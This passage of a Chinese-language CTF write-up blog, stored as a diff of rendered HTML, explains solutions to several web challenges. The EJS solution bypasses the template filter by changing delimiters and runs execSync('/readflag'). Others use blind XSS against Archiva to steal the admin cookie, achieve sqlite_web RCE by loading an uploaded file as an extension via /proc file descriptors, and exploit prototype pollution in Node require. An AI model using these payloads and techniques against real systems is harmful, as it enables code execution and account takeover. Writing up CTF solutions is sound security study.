+  <span class="token keyword">var</span> filename <span class="token operator">=</span> options<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>
+  <span class="token keyword">var</span> hasTemplate <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'cache option requires a filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    func <span class="token operator">=</span> exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 获取到之前的func就返回了</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">return</span> func<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">// istanbul ignore if: should not happen at all</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Internal EJS error: no file name or template '</span>
+                    <span class="token operator">+</span> <span class="token string">'provided'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  func <span class="token operator">=</span> exports<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 这行会进入后续的渲染</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// cache为true时渲染完成就将这个模板函数放入cache，下次再调用时在前面获取到已经编译过的模板就返回回去了</span>
+    exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> func<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>而本题在写入模板后会同时302用户访问模板进行渲染，导致cache出现，导致后续的payload打不通。解决方法有两种，1. 上burp抓包，不302重定向过去然后第一次访问带上payload打通，2. 等个 半天等cache过期或者被挤掉（没有仔细看cache生命周期）</p>
+<h3 id="解2"><a href="#解2" class="headerlink" title="解2"></a>解2</h3><p>看到上面可控的那一堆opts参数，还有另一个在当前情况下可以利用，那就是<code>delimiter</code>，因为本题是限制了<code>&lt;%</code>的出现，而<code>&lt;%</code>是ejs的默认标签，实际上这个值是可以被修改的，分别对应上述opts中的<code>openDelimiter</code>,<code>delimiter</code>,<code>closeDelimiter</code>，只要将openDelimiter由<code>&lt;</code>改为其他值，就能绕过写入模板时的限制，类似于<code>render_template_string</code>这种洞一样当场渲染，并且也直接将执行的结果进行输出</p>
+<p>将<code>&lt;&gt;</code>替换为<code>12</code>即可<br><code>1%= process.mainModule.require(&#39;child_process&#39;).execSync(&#39;/readflag&#39;) %2</code></p>
+<h3 id="控制cache"><a href="#控制cache" class="headerlink" title="控制cache?"></a>控制cache?</h3><p>既然opt的每个值都能被控制，能不能反手控制cache，改成false禁用掉呢。说得好，然后试了一下发现并不行，具体原因也发生在我们用<code>data.settings[&#39;view options&#39;]</code>来控制opt那块</p>
+<p>在我们用view options控制了opts部分属性之后，还有一个<code>utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);</code>对将data中的数据赋值到了opt中，而这个<code>_OPTS_PASSABLE_WITH_DATA_EXPRESS</code>为如下值</p>
+<pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> _OPTS_PASSABLE_WITH_DATA <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'delimiter'</span><span class="token punctuation">,</span> <span class="token string">'scope'</span><span class="token punctuation">,</span> <span class="token string">'context'</span><span class="token punctuation">,</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> <span class="token string">'compileDebug'</span><span class="token punctuation">,</span>
+  <span class="token string">'client'</span><span class="token punctuation">,</span> <span class="token string">'_with'</span><span class="token punctuation">,</span> <span class="token string">'rmWhitespace'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'async'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// We don't allow 'cache' option to be passed in the data obj for</span>
+<span class="token comment" spellcheck="true">// the normal `render` call, but this is where Express 2 &amp; 3 put it</span>
+<span class="token comment" spellcheck="true">// so we make an exception for `renderFile`</span>
+<span class="token keyword">var</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS <span class="token operator">=</span> _OPTS_PASSABLE_WITH_DATA<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>刚好加了个cache上去，那么data中的cache值又从哪来呢。这个过程发生在<code>express/lib/application.js</code>的<code>render</code>函数中，这里的<code>renderOptions</code>就是我们后面的data，这里会因为express的配置显式的将cache赋值，此处由于是production环境，所以得到的结果是true，无法控制了捏</p>
+<pre class=" language-js"><code class="language-js">  <span class="token comment" spellcheck="true">// set .cache unless explicitly provided</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+</code></pre>
+<p>这个题是最简单的web，大家感觉都乱秒这个题。。。虽然说前面半截的利用确实老了点，但是之前我也没有好好调这种东西，并且一开始没有意识到洞在这个传入变量没写好上。。。控制住之后对后面的利用细节也不了解，临时调过还是花了几个小时，学到许多.jpg</p>
+<h2 id="archived"><a href="#archived" class="headerlink" title="archived"></a>archived</h2><p>一个看了半天不知道在干什么然后实际做起来很简单的题。。。</p>
+<p>开局给的docker file超级复杂，加上题目形式是一个bot+一个challenge，challenge还不搞公有环境，私有环境开出来还上一个代理，需要通过http header认证，导致我一个小时在读各种配置文件查这个题到底在干什么。。。（还是不熟java了，jetty能干嘛真不熟）</p>
+<h3 id="admin-bot"><a href="#admin-bot" class="headerlink" title="admin bot"></a>admin bot</h3><p>没啥功能，因为题目的架构问题，所以又要输proxy密码又要输admin密码的，实际上就是访问一次题目的<code>/repository/internal</code>路径，没了</p>
+<h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h3><p>真的给我看麻了都没看懂。。。<br>里面一个archiva.xml配了一堆东西，一个jetty.xml配了一堆东西，一个setup.sh配置了archiva一堆属性，entrypoint.sh启动了jetty，resource-retriever.sh下载archiva</p>
+<p>然后我找了半天这到底起了个啥服务干了些啥。。。嗯是没看懂，jetty也不熟，搜了一下说是能当http服务器，也能用于机器间通信</p>
+<p>主要是找了半天想找找源码之类的东西，结果最后发现就没有源码，就直接是jetty起了个archiva。。。</p>
+<p>配置文件也没啥看的，实际上就是完整的给你提供了一个本地环境而已，要做的就是一个盲打xss</p>
+<p>。。。看了半天啥也没学会</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>远程是只有一个普通用户ctf的权限的，上去就一个功能上传文件，这个玩意感觉就是个maven仓库一样的东西，可以传文件然后group id artifacts id之类的，其中group id会出现在admin会访问的<code>/repository/internal</code>中，放在a标签的href属性里面。</p>
+<p>有简单的黑名单，尖括号直接新开标签是不允许的，但是可以直接双引号属性逃逸出来。。。然后可以从burp的xss cheatsheet里面抄一个payload，onfocus+autofocus触发xss</p>
+<p>能xss然后反手偷cookie即可<br>但是xss过滤也不止一个尖括号，点斜杠什么的也不能用，这样子就不好外带数据了，但是绕过也很简单，<code>eval(atob(base64....))</code>就直接过了，但是我一时间居然没有反应过来。。。鉴定为纯纯的菜逼</p>
+<p>cookie偷出来之后直接在控制台<code>document.cookie=</code>赋值就能访问上去，但是会出现一个报错说权限不够，需要额外认证，整了我们半天，最后本地开环境试了半天之后发现，这个admin是有两个cookie的，但是document.cookie赋值一次只能赋值上一个，分号后面的内容给忽略掉了，所以把整个cookie字段复制进去实际上只放进去了一个。。。需要把两个cookie分别赋值两次，第二次反而不会覆盖前面的而是添加一个新的上去</p>
+<p>然后在admin界面乱点，在仓库管理那里可以更改仓库的根目录，改成文件系统根目录就能直接访问flag了</p>
+<p>另：editthiscookie这个插件好像用不了了，不然就不会有这个问题了。。。</p>
+<h2 id="sqlite-web"><a href="#sqlite-web" class="headerlink" title="sqlite_web"></a>sqlite_web</h2><p>又是一个没有源码的题，给出来的环境唯一作用为能够搭建本地复现环境，代码又是直接从github拉下来然后启动，用的是<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/coleifer/sqlite-web">coleifer&#x2F;sqlite-web</a><br>然后给数据库加了一层密，密钥是flag，flag也放到了根目录，配合了一个<code>/readflag</code>，鉴定为需要rce，且数据库这块加密屁用没有，数据库里的数据也屁用没有（也许flag搞出来了之后解密出来是彩蛋）</p>
+<h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><p>确实是彩蛋，ad下的数据就是一个ad</p>
+<blockquote>
+<p>Shameless self-ad ;) Star my repos <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/Sandr0x00">https://github.com/Sandr0x00</a><br>hxp ctf, the only ctf with memes encrypted with the flag<br>Go on and solve more challenges now</p>
+</blockquote>
+<p>之类的东西。。。出题人好闲，还整了这么多表加密这些屁话</p>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>首先有了上一个题的教训，这把直接不看给的东西（实际上也没给啥东西）。先去看一眼给出的这个依赖有没有问题，简单的看了一下就一个py文件里面写了一堆，表下的query路由可以执行任意SQL语句，一次只能执行一条语句，简单的稍微追踪了一下，感觉也绕不过去，再之启动参数是<code>nohup sqlite_web encrypted.db -x -r -e ./crypto -H 0.0.0.0 -p 80 &amp;</code>，<code>-r</code>加了readonly检查了一下也是不能绕的，等于一个只有一条语句任意执行且不能写的利用。</p>
+<p>看一下几个选项<code>-x</code>没什么用，<code>-r</code>以只读模式启动，<code>-e</code>加载插件，这里的crypto插件来自于<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/nalgeon/sqlean/blob/main/docs/crypto.md">nalgeon&#x2F;sqlean</a>，就提供了一hash函数，也就是这里用的sha256。但是你如果能加载插件的话，总觉得好像有操作空间了捏</p>
+<p>sqlite加载插件的函数为<code>load_extension</code>，第一个参数为插件路径，第二个参数为入口函数（可留空），如果在windows环境下，可以直接用网络文件共享加载远程插件，无敌利用。可惜这里是linux，不过load_extension确实符合了一个语句rce的条件，但问题在于怎么在本地文件系统上面创造一个文件呢？</p>
+<p>首先sqlite写是做不到的，首先是read only模式，其次一次只能执行一条语句，attach database只能创建出一个空文件也无法后续继续写，再次是sqlite写出来的文件会有脏数据，有脏数据是不会被识别为合法的插件的。</p>
+<p>翻一下<code>sqlite_web</code>的源码，里面有一个 import路由，允许用户上传一个文件去导入数据到数据库中，如果上传的文件会以某种形式留存在磁盘上，就可以考虑条件竞争去抢，就像PHP的session upload progress一样</p>
+<p>尝试上传，并使用chatgpt给的脚本监控文件目录</p>
+<pre class=" language-sh"><code class="language-sh">#!/bin/bash
+
+# 监视当前目录下所有文件和子目录的变化
+inotifywait -r -m -e create,delete,modify . |
+
+# 读取事件流中的每一行
+while read path action file; do
+    # 输出文件变化事件
+    echo "File $file in $path was $action"
+done
+</code></pre>
+<p>结果为屁用没有，刚好看到源码在import中处理上传文件时有这么一段注释</p>
+<blockquote>
+<p># The SpooledTemporaryFile used by werkzeug does not<br># implement an API that the TextIOWrapper expects, so we’ll<br># just consume the whole damn thing and decode it.<br># Fixed in werkzeug 0.15.</p>
+</blockquote>
+<p>搜一下这个<code>SpooledTemporaryFile</code></p>
+<blockquote>
+<p>class tempfile.SpooledTemporaryFile(max_size&#x3D;0, mode&#x3D;’w+b’, buffering&#x3D;- 1, encoding&#x3D;None, newline&#x3D;None, suffix&#x3D;None, prefix&#x3D;None, dir&#x3D;None, *, errors&#x3D;None)<br>这个类执行的操作与 TemporaryFile() 完全相同，但会将数据缓存在内存中直到文件大小超过 max_size，或者直到文件的 fileno() 方法被调用，这时文件内容会被写入磁盘并如使用 TemporaryFile() 时一样继续操作。</p>
+</blockquote>
+<p>意思是只要够大就写磁盘了，梭一个1M的文件上去，脚本有动静了，但是名字是随机的，无法预测，凉了啊</p>
+<h3 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h3><p>内存文件也有内存文件的好处，我一度居然忘记了无敌的proc文件系统，上传的文件直接可以在proc里面访问上，反而省去了猜名字，现在只要猜pid和fd就可以了</p>
+<p>pid猜测这里有一点奇怪的玄学，或者说就不用猜了，python的app稳定在pid为7的进程上，说起来linux的进程号是随着进程的创建一直递增的，docker中由于启动顺序总是一致的且没有其他干扰(大概)，导致app的pid稳定在了7，并且这里使用的是development时使用的<code>werkzeug</code>，就一个进程跑，不会重启不会拉子进程，确保了pid的稳定性。确保了pid，剩下的fd就是选一个范围硬爆了</p>
+<p>不过即使这样，内存文件的驻留时间也很短，竞争难度大。rmb提出了究极解决方案，通过修改content-length，可以强行让对方服务器等待后续内容，做到fd的长时间驻留（内容没收完居然也就在内存中有对应的fd了，真高级啊）</p>
+<p>虽然理论上好像是这个样子的，但是我试了一下没有成功。。。（以及，burp repeater中关闭content length自动补全是在最上面那一排。。。我找了半天）还是得上脚本嗯爆，嗯爆成功的前提是知道pid固定为7</p>
+<h3 id="小小的疑惑点"><a href="#小小的疑惑点" class="headerlink" title="小小的疑惑点"></a>小小的疑惑点</h3><p>如果先在web页面乱按了两下的话，会发现如果ext没有指定后缀的情况下，是会自动添加<code>.so</code>后缀的，这里的启动方法也一样，<code>-e crypto</code>，然后自动匹配了<code>crypto.so</code>。就算你创建了对应的无后缀文件，load还是会去找那个<code>.so</code>，一度让我怀疑proc能不能打，后来我发现似乎是当指定的这个文件不符合插件规则时才补齐.so后缀去找，我把题目给出的crypto.so复制一份到一个无后缀文件里再加载就跑起来了</p>
+<h2 id="true-web-assembly"><a href="#true-web-assembly" class="headerlink" title="true_web_assembly"></a>true_web_assembly</h2><p>真正的web assembly，指用汇编写一个网站，鉴定为坐牢，没看<br>但是还是有大哥给他整通了，看了下wp好像是content长度过大时title能xss，然后admin cookie是http only的，只能xss admin给用户升级到admin，升级完之后在设置里配置<code>smtp_exec</code>项，该项目会在change email的时候被执行，xss出一个admin号然后手动操作后续应该就可以了8（大概）</p>
+<p>至于为什么这个项会在这个时候触发，就是大哥们看汇编得到的结果了。。。</p>
+<h2 id="required"><a href="#required" class="headerlink" title="required"></a>required</h2><p>这个题的分类是逆向+web，所以我看了一下web部分<br>题目下下来是1k个js文件和一个require.js作为主文件，1k个文件里面还有缺失，实际上不满1k个<br>require的作用就是各种require前面的xxx.js并且加上参数调用，最后输出经过这一堆require处理过的flag，与<code>0xd19ee193b461fd8d1452e7659acb1f47dc3ed445c8eb4ff191b1abfa7969</code>进行比较，相同就对了<br>部分内容如下</p>
+<pre class=" language-js"><code class="language-js">f<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">...</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./28'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">753</span><span class="token punctuation">,</span><span class="token number">434</span><span class="token punctuation">,</span><span class="token number">790</span><span class="token punctuation">)</span>
+<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./157'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">227</span><span class="token punctuation">,</span><span class="token number">950</span><span class="token punctuation">,</span><span class="token number">740</span><span class="token punctuation">)</span>
+<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./736'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">722</span><span class="token punctuation">,</span><span class="token number">540</span><span class="token punctuation">,</span><span class="token number">325</span><span class="token punctuation">)</span>
+<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./555'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">937</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">229</span><span class="token punctuation">)</span>
+<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./394'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">192</span><span class="token punctuation">,</span><span class="token number">733</span><span class="token punctuation">,</span><span class="token number">981</span><span class="token punctuation">)</span>
+<span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>看一眼28.js的内容</p>
+<pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token punctuation">(</span>t<span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>o<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./289'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>K<span class="token punctuation">,</span>V<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>V<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>o<span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token operator">=</span>o<span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token operator">||</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>o<span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>i<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>首先是这一段<code>i+=[],j+&quot;&quot;,t=(t+&#123;&#125;).split(&quot;[&quot;)[0]</code>功能实际上就是把输入的数字变成字符串，然后require了289.js，看一眼289.js</p>
+<pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token punctuation">(</span>t<span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`{"__proto__":{"data":{"name":"./</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>i<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">","exports":{".": "./</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>j<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.js"}},"path": "./"}}`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>返回了一个赋值好<code>__proto__</code>的对象，而后面的这段<code>forEach(([K,V])=&gt;Object.entries(V).forEach(([k,v])=&gt;(o[K]=o[K]||&#123;&#125;,o[K][k]=v)))</code>操作就是在进行原型链污染，把<code>__proto__</code>的各个属性赋值到空对象o上去，最后<code>require i.js</code></p>
+<p>但是实际上找一下会发现，i对应的很多文件是不存在的，这是怎么回事捏</p>
+<p>这就要看这个奇怪的原型链污染操作了，污染了一些奇奇怪怪的东西，如果进行回忆之前balsn的那一个题，就能想起许多<br><a href="https://blog.z3ratu1.cn/BalsnCTF2022web%20wp.html#2linenodejs">balsnCTF2022</a></p>
+<p>再跟着当时的情况调一下，如果没有package.json，原型链污染控制data和path，data需要和require中的字符串一致，就会去加载path下的exports。这样子就完美解释了捏</p>
+<p>比如<code>require(&#39;./555&#39;)(504,897,229)</code>，555.js内容如下</p>
+<pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token punctuation">(</span>t<span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>o<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./289'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>K<span class="token punctuation">,</span>V<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>V<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span>k<span class="token punctuation">,</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>o<span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token operator">=</span>o<span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token operator">||</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>o<span class="token punctuation">[</span>K<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">=</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>j<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>实际上加载的是require(‘.&#x2F;289’)时的第二个参数t，也就是229.js，而非j对应的897.js这样子。而此时加载的脚本都是一些简单的位操作，对flag进行各种与或非移位之类的</p>
+<pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>j<span class="token operator">%</span><span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>t<span class="token operator">%</span><span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token punctuation">(</span>t<span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>除了上述的简介加载和直接加载以外，还有一个特殊文件556.js，用来清理require.cache，不知道会不会影响原型链污染的加载情况，但是人工看了一下之后发现556.js后面没有接加载不存在文件的操作，所以忽略掉</p>
+<pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token punctuation">(</span>t<span class="token operator">+</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>require<span class="token 